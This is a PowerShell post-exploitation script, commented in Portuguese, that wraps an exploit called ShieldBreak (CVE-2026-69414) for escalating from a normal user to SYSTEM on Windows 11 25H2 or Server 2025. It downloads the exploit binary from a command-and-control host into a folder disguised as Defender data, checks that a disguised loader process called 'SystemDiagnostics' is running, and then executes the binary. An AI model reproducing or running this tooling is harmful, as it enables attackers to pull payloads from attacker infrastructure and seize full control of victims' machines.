# shieldbreak_wrapper.ps1 — Wrapper para ShieldBreak (CVE-2026-69414)
# Requer: Windows 11 25H2 ou Server 2025
# Requer: Loader já executando (código rodando no sistema)
#
# ShieldBreak explora vulnerabilidade no mecanismo do Defender
# para elevar de usuário comum para NT AUTHORITY\SYSTEM
#
# Uso:
#   .\shieldbreak_wrapper.ps1                    (modo padrão)
#   .\shieldbreak_wrapper.ps1 -DownloadFirst     (baixar ShieldBreak primeiro)

param(
    [switch]$DownloadFirst
)

$ErrorActionPreference='SilentlyContinue'

# ── Configuração ──────────────────────────────────────────────────────────────
$C2 = "c2.convert1ri.com"
$SHIELDBREAK_URL = "https://$C2/download/ShieldBreak.exe"
$INSTALL_DIR = "$env:TEMP\Microsoft\WinDefData"
$EXE_PATH = "$INSTALL_DIR\ShieldBreak.exe"

# ── Verificar Windows 11 25H2+ ────────────────────────────────────────────────
$build = [int](Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').CurrentBuild
if ($build -lt 26100) {
    Write-Host "[-] Windows 11 25H2+ requerido (build >= 26100)" -ForegroundColor Red
    Write-Host "    Build atual: $build" -ForegroundColor Yellow
    exit 1
}
Write-Host "[+] Windows 11 25H2+ detectado (build $build)" -ForegroundColor Green

# ── Baixar ShieldBreak se necessário ──────────────────────────────────────────
if ($DownloadFirst -or !(Test-Path $EXE_PATH)) {
    Write-Host "[*] Baixando ShieldBreak..."
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        (New-Object Net.WebClient).DownloadFile($SHIELDBREAK_URL, $EXE_PATH)
        Write-Host "[+] ShieldBreak baixado: $EXE_PATH" -ForegroundColor Green
    } catch {
        Write-Host "[-] Falha ao baixar ShieldBreak: $_" -ForegroundColor Red
        exit 1
    }
}

# ── Verificar se o loader está rodando ────────────────────────────────────────
$loaderRunning = Get-Process -Name "SystemDiagnostics" -ErrorAction SilentlyContinue
if (-not $loaderRunning) {
    Write-Host "[-] Loader não está rodando. Execute o loader primeiro." -ForegroundColor Red
    exit 1
}
Write-Host "[+] Loader rodando (PID: $($loaderRunning.Id))" -ForegroundColor Green

# ── Executar ShieldBreak ──────────────────────────────────────────────────────
Write-Host "[*] Executando ShieldBreak (CVE-2026-69414)..."
Write-Host "[*] Requer: Windows 11 25H2+ | Loader rodando" -ForegroundColor Yellow

try {
    $result = & $EXE_PATH 2>&1
    Write-Host $result
    
    # Verificar se elevou para SYSTEM
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
    if ($currentUser -eq "NT AUTHORITY\SYSTEM") {
        Write-Host "[+] ELEVAÇÃO PARA SYSTEM BEM-SUCEDIDA!" -ForegroundColor Green
    } else {
        Write-Host "[!] Usuário atual: $currentUser" -ForegroundColor Yellow
    }
} catch {
    Write-Host "[-] ShieldBreak falhou: $_" -ForegroundColor Red
}

Write-Host "[*] ShieldBreak finalizado" -ForegroundColor Cyan
